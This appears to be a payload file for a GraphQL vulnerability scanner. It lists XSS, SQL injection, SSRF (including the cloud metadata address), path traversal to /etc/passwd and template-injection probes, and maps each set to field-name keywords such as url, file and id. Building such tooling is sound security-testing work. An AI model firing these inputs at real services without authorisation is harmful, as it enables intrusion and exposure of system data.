# Payload Database
# Categories: XSS, SQLi, SSRF, Path Traversal, Generic

PAYLOADS = {
    "XSS": [
        "<script>alert(1)</script>",
        "\"><script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(1)"
    ],
    "SQLi": [
        "' OR '1'='1",
        "1' OR '1'='1",
        "' OR 1=1--",
        "admin' --",
        "' UNION SELECT 1, version() --"
    ],
    "SSRF": [
        "http://localhost:80",
        "http://127.0.0.1:80",
        "http://169.254.169.254/latest/meta-data/",
        "file:///etc/passwd",
        "http://example.com"
    ],
    "PathTraversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "/etc/passwd",
        "C:\\Windows\\System32\\drivers\\etc\\hosts"
    ],
    "Generic": [
        "test\"test",
        "test'test",
        "{{7*7}}", # SSTI
        "${7*7}"
    ]
}

# Mapping configuration
# Keys are payload categories
# Values are dicts with 'types' (GraphQL Scalar types) and 'keywords' (Field name substrings)

PAYLOAD_MAPPING = {
    "XSS": {
        "types": ["String"],
        "keywords": ["name", "title", "comment", "description", "bio", "text", "content", "message"]
    },
    "SQLi": {
        "types": ["String", "ID", "Int"],
        "keywords": ["id", "user", "name", "search", "filter", "query", "key", "uuid"]
    },
    "SSRF": {
        "types": ["String"],
        "keywords": ["url", "uri", "link", "webhook", "callback", "host", "site", "avatar", "image"]
    },
    "PathTraversal": {
        "types": ["String"],
        "keywords": ["file", "path", "location", "dir", "folder", "image", "doc"]
    },
    "Generic": {
        "types": ["String", "Int", "Float", "ID"],
        "keywords": [] # Fallback
    }
}
